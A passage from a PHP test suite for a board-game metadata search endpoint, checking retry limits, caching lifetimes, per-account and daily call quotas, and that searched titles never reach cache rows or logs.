        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre([FakeBggApi::game()]);

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(200);
        self::assertSame('KOSMOS', $this->candidates($body)[0]['publisher']);
        self::assertSame(2, FakeBggApi::searchCalls());
    }

    public function testAnAnswerThatStaysQueuedStopsAtThreeTriesAndLeavesNoRow(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        for ($i = 0; $i < 5; ++$i) {
            FakeBggApi::searchAnswers(202, '');
        }

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(502);
        self::assertSame('metadata_failed', $body['error'] ?? null);
        self::assertSame(3, FakeBggApi::searchCalls());
        self::assertSame(0, $this->cacheRows());
    }

    public function testAServerErrorThatKeepsComingStopsAtThreeTriesAndLeavesNoRow(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        for ($i = 0; $i < 5; ++$i) {
            FakeBggApi::searchAnswers(500, 'oops');
        }

        $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(502);
        self::assertSame(3, FakeBggApi::searchCalls());
        self::assertSame(0, $this->cacheRows());
    }

    public function testASlowSiteIsNotAskedAgain(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFails(new TransportException('Idle timeout reached'));

        $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(502);
        self::assertSame(1, FakeBggApi::calls());
    }

    // --- 7. A detail that fails -----------------------------------------------------------------------------------------

    public function testADetailThatIsQueuedLeavesTheCandidatesIncompleteAndIsNotRemembered(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem(13), FakeBggApi::searchItem(14, 'Other')]);
        FakeBggApi::detailAnswers(202, '');

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(200);
        self::assertSame(['CATAN', 'Other'], array_column($this->candidates($body), 'title'));
        self::assertNull($this->candidates($body)[0]['publisher']);
        self::assertSame(0, $this->detailRows());

        // Next time they are asked again, and answered.
        FakeBggApi::detailsAre([FakeBggApi::game(13), FakeBggApi::game(14, 'Other')]);
        $again = $this->search($client, $ada, 'boardgame', 'catan');
        self::assertSame('KOSMOS', $this->candidates($again)[0]['publisher']);
    }

    public function testADetailRefusedOnQuotaPausesThatSiteForTheNextSearch(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailAnswers(429, '');

        $this->search($client, $ada, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(200);
        $this->search($client, $ada, 'boardgame', 'other');

        self::assertResponseStatusCodeSame(503);
        self::assertSame(2, FakeBggApi::calls());
    }

    public function testAGameTheSiteHasNoDetailOfIsRememberedForAnHourAndTheOthersForThirtyDays(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem(13), FakeBggApi::searchItem(14, 'Other')]);
        FakeBggApi::detailsAre([FakeBggApi::game(13)]);

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertSame('KOSMOS', $this->candidates($body)[0]['publisher']);
        self::assertNull($this->candidates($body)[1]['publisher']);
        $now = new \DateTimeImmutable();
        $fresh = static fn (string $code, \DateTimeImmutable $at): bool => (self::getContainer()->get(EntityManagerInterface::class)->getRepository(MetadataCacheEntry::class)->findOneBy(['provider' => 'bgg_boardgame', 'code' => $code]) ?? self::fail('No row.'))->isFreshAt($at);
        self::assertTrue($fresh('13', $now->modify('+29 days')));
        self::assertFalse($fresh('13', $now->modify('+31 days')));
        self::assertTrue($fresh('14', $now->modify('+30 minutes')));
        self::assertFalse($fresh('14', $now->modify('+2 hours')));
    }

    public function testASearchStoredByAnotherRequestMeanwhileStillAnswers(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre([FakeBggApi::game()]);
        $connection = $this->entityManager()->getConnection();
        FakeBggApi::$whileSearching = static function () use ($connection): void {
            $connection->executeStatement(
                'INSERT INTO metadata_cache (id, provider, code, found, payload, fetched_at) VALUES (:id, :provider, :code, true, :payload, now())',
                ['id' => (string) Uuid::v7(), 'provider' => 'bgg_search', 'code' => BggSearch::fingerprint('boardgame', 'catan'), 'payload' => '{"hits":[]}'],
            );
        };

        $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(200);
    }

    // --- 8. Nothing says who or what ------------------------------------------------------------------------------------

    public function testTwoAccountsLookingForTheSameCostOneRoundOfCallsAndNoRowSaysWhoOrWhat(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $grace = $this->account($client, 'grace@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre([FakeBggApi::game()]);
        $activity = $this->entityManager()->getRepository(ActivityEntry::class)->count([]);

        $this->search($client, $ada, 'boardgame', self::SECRET_TITLE);
        $this->search($client, $grace, 'boardgame', strtoupper(self::SECRET_TITLE));

        self::assertSame(2, FakeBggApi::calls());
        self::assertSame(['id', 'provider', 'code', 'found', 'payload', 'fetched_at'], $this->cacheColumns());
        $rows = implode("\n", $this->allCacheRowsAsText());
        self::assertStringNotContainsStringIgnoringCase('zxqv', $rows);
        self::assertStringNotContainsStringIgnoringCase('private title', $rows);
        self::assertStringNotContainsString('ada@example.com', $rows);
        self::assertContains(BggSearch::fingerprint('boardgame', self::SECRET_TITLE), $this->codes());
        self::assertSame($activity, $this->entityManager()->getRepository(ActivityEntry::class)->count([]));
    }

    public function testTheSearchedTitleReachesNoLogEvenWhenSomethingGoesWrong(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchAnswers(429, '<error/>');
        $this->search($client, $ada, 'boardgame', self::SECRET_TITLE);
        $this->clearBrake();
        FakeBggApi::searchAnswers(500, 'x');
        FakeBggApi::searchAnswers(500, 'x');
        FakeBggApi::searchAnswers(500, 'x');
        $this->search($client, $ada, 'boardgame', self::SECRET_TITLE.' two');
        FakeBggApi::searchAnswers(200, '<?xml version="1.0"?><!DOCTYPE items><items/>');
        $this->search($client, $ada, 'boardgame', self::SECRET_TITLE.' three');
        $this->search($client, $ada, 'book', self::SECRET_TITLE);
        $this->search($client, $ada, 'boardgame', self::SECRET_TITLE."\n");
        $client->request('POST', '/v1/metadata/bgg/search', server: $ada['headers'] + ['CONTENT_TYPE' => 'application/json'], content: '{"scope":"rpg","query":"'.self::SECRET_TITLE.'"');
        $client->request('POST', '/v1/metadata/bgg/search', server: $ada['headers'] + ['CONTENT_TYPE' => 'application/json'], content: '{"scope":"rpg","query":"'.self::SECRET_TITLE.'","extra":1}');

        self::assertNotSame('', RecordingLogger::everything(), 'the logger must be the one the test reads');
        self::assertStringNotContainsStringIgnoringCase('zxqv', RecordingLogger::everything());
        self::assertStringNotContainsStringIgnoringCase('private title', RecordingLogger::everything());
    }

    // --- 9. Limits ----------------------------------------------------------------------------------------------------

    public function testAnAccountPastItsOwnShareOfRealCallsIsCutAndTheCacheStillServesIt(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $grace = $this->account($client, 'grace@example.com');
        self::getContainer()->get('limiter.bgg_account')->create($this->user('ada@example.com')->getId()->toRfc4122())->consume(100);
        FakeBggApi::searchFinds([]);

        $refused = $this->search($client, $ada, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(429);
        self::assertSame('too_many_requests', $refused['error'] ?? null);

        $this->search($client, $grace, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(200);
        $this->search($client, $ada, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(200);
        self::assertSame(1, FakeBggApi::calls());
    }

    public function testAnAccountPastItsSharedLimitIsCutAndTheOthersAreNot(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $grace = $this->account($client, 'grace@example.com');
        $limiter = self::getContainer()->get(RequestLimiter::class);
        // The limit is the same as the other providers': what an account spends there is spent here.
        for ($i = 0; $i < 599; ++$i) {
            $limiter->consumeMetadata($this->user('ada@example.com')->getId()->toRfc4122());
        }
        FakeBggApi::searchFinds([]);
        FakeBggApi::searchFinds([]);

        $this->search($client, $ada, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(200);
        $this->search($client, $ada, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(429);

        $this->search($client, $grace, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(200);
    }

    public function testWhenTheServersDayIsSpentTheCacheKeepsServing(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre([FakeBggApi::game()]);
        $this->search($client, $ada, 'boardgame', 'catan');
        $limiter = self::getContainer()->get(RequestLimiter::class);
        for ($i = 0; $i < 998; ++$i) {
            $limiter->consumeBggCall(); // with the two calls made above, the 1,000 of the day
        }

        $cached = $this->search($client, $ada, 'boardgame', 'catan');
        self::assertResponseStatusCodeSame(200);
        self::assertSame('KOSMOS', $this->candidates($cached)[0]['publisher']);

        $other = $this->search($client, $ada, 'rpg', 'other');
        self::assertResponseStatusCodeSame(503);
        self::assertSame('metadata_quota_exhausted', $other['error'] ?? null);
        self::assertSame(2, FakeBggApi::calls());
    }

    public function testTheDaysCapComesFromTheVariableAndNeedsNoCode(): void
    {
        $_ENV['BGG_DAILY_CALL_CAP'] = $_SERVER['BGG_DAILY_CALL_CAP'] = '3';
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([FakeBggApi::searchItem()]);
        FakeBggApi::detailsAre([FakeBggApi::game()]);
        FakeBggApi::searchFinds([FakeBggApi::searchItem(14, 'Other')]);
        FakeBggApi::detailsAre([FakeBggApi::game(14, 'Other')]);

        $this->search($client, $ada, 'boardgame', 'catan'); // two of the three calls
        self::assertResponseStatusCodeSame(200);
        $body = $this->search($client, $ada, 'boardgame', 'other'); // the search is the third; its details are not asked
        self::assertResponseStatusCodeSame(200);
        self::assertNull($this->candidates($body)[0]['publisher']);
        $this->search($client, $ada, 'boardgame', 'third');

        self::assertResponseStatusCodeSame(503);
        self::assertSame(3, FakeBggApi::calls());
    }

    public function testTheDayRunningOutWhileTheDetailsAreAskedLeavesThemIncomplete(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        $limiter = self::getContainer()->get(RequestLimiter::class);
        for ($i = 0; $i < 999; ++$i) {
            $limiter->consumeBggCall(); // only the search is left
        }
        FakeBggApi::searchFinds([FakeBggApi::searchItem(1, 'One'), FakeBggApi::searchItem(2, 'Two')]);
        FakeBggApi::detailsAre([FakeBggApi::game(1, 'One'), FakeBggApi::game(2, 'Two')]);

        $body = $this->search($client, $ada, 'boardgame', 'catan');

        self::assertResponseStatusCodeSame(200);
        self::assertSame(['One', 'Two'], array_column($this->candidates($body), 'title'));
        self::assertSame(1, FakeBggApi::calls());
    }

    // --- The cache's age ------------------------------------------------------------------------------------------------

    public function testASearchIsKeptSevenDays(): void
    {
        $client = $this->world();
        $ada = $this->account($client, 'ada@example.com');
        FakeBggApi::searchFinds([]);
        $this->search($client, $ada, 'boardgame', 'catan');

        $entry = $this->entityManager()->getRepository(MetadataCacheEntry::class)->findOneBy(['provider' => 'bgg_search']) ?? self::fail('No row.');

        self::assertTrue($entry->isFreshAt(new \DateTimeImmutable('+6 days')));
        self::assertFalse($entry->isFreshAt(new \DateTimeImmutable('+8 days')));
    }

    // --- helpers ------------------------------------------------------------------------------------------------------

    private function world(): KernelBrowser
    {
        $_ENV['BGG_API_TOKEN'] = $_SERVER['BGG_API_TOKEN'] = self::TOKEN;
        self::ensureKernelShutdown();
        $client = self::createClient();
        self::getContainer()->get('cache.rate_limiter')->clear();
        self::getContainer()->get('cache.auth_challenge')->clear();
        $this->clearBrake();
        FakeBggApi::reset();
        RecordingLogger::reset();

        return $client;
    }

    private function clearBrake(): void
    {
        self::getContainer()->get('cache.metadata')->clear();
    }

    /** @return array{headers: array<string, string>, device_id: string, token: string, public_key: string, secret_key: string, email: string} */
    private function account(KernelBrowser $client, string $email): array
    {
        return $this->signInNewDevice($client, $email);
    }

    /** @return list<mixed> what `GET /v1/server` says it looks up */
    private function offered(KernelBrowser $client): array
    {
        $metadata = $this->decode($client)['metadata'] ?? [];

        return \is_array($metadata) ? array_values($metadata) : [];
    }

    private function payload(string $scope, string $query): string
    {
        return json_encode(['scope' => $scope, 'query' => $query], \JSON_THROW_ON_ERROR | \JSON_INVALID_UTF8_SUBSTITUTE);
    }

    /**
     * @param array{headers: array<string, string>} $session
     *
     * @return array<string, mixed>
     */
    private function search(KernelBrowser $client, array $session, string $scope, string $query): array
    {
        $this->raw($client, $session, $scope, $query);

        return $this->decode($client);
    }

    /** @param array{headers: array<string, string>} $session */
    private function raw(KernelBrowser $client, array $session, string $scope, string $query): string
    {
        $client->request('POST', '/v1/metadata/bgg/search', server: $session['headers'] + ['CONTENT_TYPE' => 'application/json'], content: $this->payload($scope, $query));

        return (string) $client->getResponse()->getContent();
    }

    /**
     * @param array<string, mixed> $body
     *
     * @return list<array<string, mixed>>
     */
    private function candidates(array $body): array
    {
        $list = $body['candidates'] ?? [];
        $out = [];
        foreach (\is_array($list) ? $list : [] as $candidate) {
            $row = [];
            foreach (\is_array($candidate) ? $candidate : [] as $key => $value) {
                $row[(string) $key] = $value;
            }
            $out[] = $row;
        }

        return $out;
    }

    /** @return array<string, mixed> */
    private function decode(KernelBrowser $client): array
    {
        return $this->decodeText((string) $client->getResponse()->getContent());
    }

    /** @return array<string, mixed> */
    private function decodeText(string $text): array
    {
        $decoded = json_decode($text, true);
        if (!\is_array($decoded)) {
            return [];
        }
        $body = [];
        foreach ($decoded as $key => $value) {
            $body[(string) $key] = $value;
        }

        return $body;
    }

    private function entityManager(): EntityManagerInterface
    {
        return self::getContainer()->get(EntityManagerInterface::class);
    }

    private function user(string $email): User
    {
        return $this->entityManager()->getRepository(User::class)->findOneBy(['email' => $email]) ?? self::fail('No such user.');
    }

    private function numberFrom(string $sql): int
    {
        $count = $this->entityManager()->getConnection()->fetchOne($sql);

        return is_numeric($count) ? (int) $count : self::fail('Not a count.');
    }

    private function cacheRows(): int
    {
        return $this->numberFrom('SELECT COUNT(*) FROM metadata_cache');
    }

    private function detailRows(): int
    {
        return $this->numberFrom("SELECT COUNT(*) FROM metadata_cache WHERE provider LIKE 'bgg\\_boardgame%' OR provider LIKE 'bgg\\_rpg%'");
    }

    /** @return list<string> */
    private function codes(): array
    {
        return $this->strings($this->entityManager()->getConnection()->fetchFirstColumn('SELECT code FROM metadata_cache ORDER BY code'));
    }

    /**
     * @param list<mixed> $values
     *
     * @return list<string>
     */
    private function strings(array $values): array
    {
        return array_map(static fn (mixed $value): string => \is_string($value) ? $value : self::fail('Not a string.'), $values);
    }

    /** @return list<string> */
    private function cacheColumns(): array
    {
        return $this->strings($this->entityManager()->getConnection()->fetchFirstColumn(
            "SELECT column_name FROM information_schema.columns WHERE table_name = 'metadata_cache' ORDER BY ordinal_position"
        ));
    }

    /** @return list<string> */
    private function allCacheRowsAsText(): array
    {
        $rows = $this->entityManager()->getConnection()->fetchAllAssociative('SELECT * FROM metadata_cache');

        return array_map(static fn (array $row): string => json_encode($row, \JSON_THROW_ON_ERROR), $rows);
    }

    /** @param array<string, mixed> $payload */
    private function store(string $provider, string $code, bool $found, array $payload, \DateTimeImmutable $at): void
    {
        $this->entityManager()->persist(new MetadataCacheEntry($provider, $code, $found, $payload, $at));
        $this->entityManager()->flush();
    }
}
